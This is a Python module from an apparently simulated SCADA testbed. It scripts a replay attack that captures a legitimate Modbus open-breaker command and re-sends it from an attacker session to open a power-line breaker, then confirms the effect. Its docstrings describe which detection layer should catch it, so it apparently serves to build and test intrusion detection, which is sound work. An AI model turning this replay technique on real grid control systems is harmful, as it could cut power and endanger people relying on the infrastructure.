"""Attack #4 — Unauthorized breaker operation via replay.

Captures a legitimate breaker command issued earlier by the real control center
(exactly the kind of frame Phase 2 logs), then re-issues that byte-identical
command later, out of its operational context, from an attacker session. The
grid obeys — a breaker opens with no operator intent behind it.

Target detection layer: L2 (protocol) — command-sequence model + the fact that
a control action arrives with no preceding operator workflow / as a duplicate
of a previously-seen frame from a different source.
"""
from __future__ import annotations

import time

from .common import AttackResult, register, cli_main, live_scada
from scada import rtu_map as rm


ATTACKER_LABEL = "replay-bot"
ATTACKER_HOST = "10.0.7.66"


@register("replay", attack_class=4, title="Unauthorized breaker operation (replay)", layer="L2 protocol")
def run(rtu_id: str = "rtu-21", line_id: int = 26, system=None) -> AttackResult:
    from scada.control_center import CapturingModbusClient

    with live_scada(system) as sysm:
        cap = sysm.capture
        spec = next(s for s in sysm.specs if s.rtu_id == rtu_id)
        slot = spec.line_slot(line_id)

        # 1) LEGITIMATE command we will "record": operator opens the breaker for
        #    maintenance, then closes it again (normal, in-context).
        sysm.control.operate_breaker(rtu_id, line_id, close=False)
        time.sleep(0.5)
        sysm.control.operate_breaker(rtu_id, line_id, close=True)
        time.sleep(0.5)

        # 2) The attacker sniffs the capture and pulls the legitimate OPEN frame.
        recorded = None
        for e in cap.events(capture_point="client"):
            if e.function_code == 5 and e.dst == rtu_id and e.address == rm.CO_BREAKER_BASE + slot \
                    and e.values == [False]:
                recorded = e
                break

        # 3) REPLAY: re-issue the identical frame from an attacker session, out of
        #    context (no operator was opening this breaker now).
        before = next(l.breaker_closed for l in sysm.engine.snapshot.lines if l.line_id == line_id)
        atk = CapturingModbusClient(spec, src_label=ATTACKER_LABEL,
                                    capture=cap, src_host=ATTACKER_HOST)
        atk.connect()
        atk.write_coil(rm.CO_BREAKER_BASE + slot, False,
                       note=f"REPLAY of recorded legit open (line {line_id})")
        atk.close()

        # 4) confirm the grid obeyed the replayed command
        opened = False
        deadline = time.time() + 3.0
        while time.time() < deadline:
            if not next(l.breaker_closed for l in sysm.engine.snapshot.lines if l.line_id == line_id):
                opened = True
                break
            time.sleep(0.05)

    return AttackResult(
        name="replay",
        attack_class=4,
        title="Unauthorized breaker operation (replay)",
        target_detection_layer="L2 protocol (command-sequence / context model)",
        executed=opened,
        changed=[
            f"recorded a legitimate FC5 open-breaker command for line {line_id} on {rtu_id}",
            f"replayed the byte-identical frame from '{ATTACKER_LABEL}' ({ATTACKER_HOST})",
            f"line {line_id} breaker: {'CLOSED->OPEN' if opened else 'unchanged'} "
            "with no operator intent",
        ],
        evidence={
            "recorded_frame": None if recorded is None else {
                "fc": recorded.function_code, "dst": recorded.dst,
                "address": recorded.address, "values": recorded.values,
                "orig_src": recorded.src},
            "replay_src": ATTACKER_LABEL,
            "replay_matches_recorded": recorded is not None,
        },
        why_hard_to_catch=(
            "The replayed frame is a valid, in-spec FC5 write to a coil that legitimately "
            "accepts writes, carrying a value the operator really did send an hour ago — "
            "so per-field allowlists and range checks all pass, and a stateless protocol "
            "check sees a normal breaker command. What betrays it is *context*: it "
            "duplicates a previously-seen command, arrives from a source that is not the "
            "control center, and has no preceding operator workflow. That needs L2's "
            "command-sequence model, not a content filter."
        ),
        artifacts={},
    )


def _extra(p):
    p.add_argument("--rtu-id", default="rtu-21")
    p.add_argument("--line-id", type=int, default=26)


if __name__ == "__main__":
    raise SystemExit(cli_main(run, extra_args=_extra))
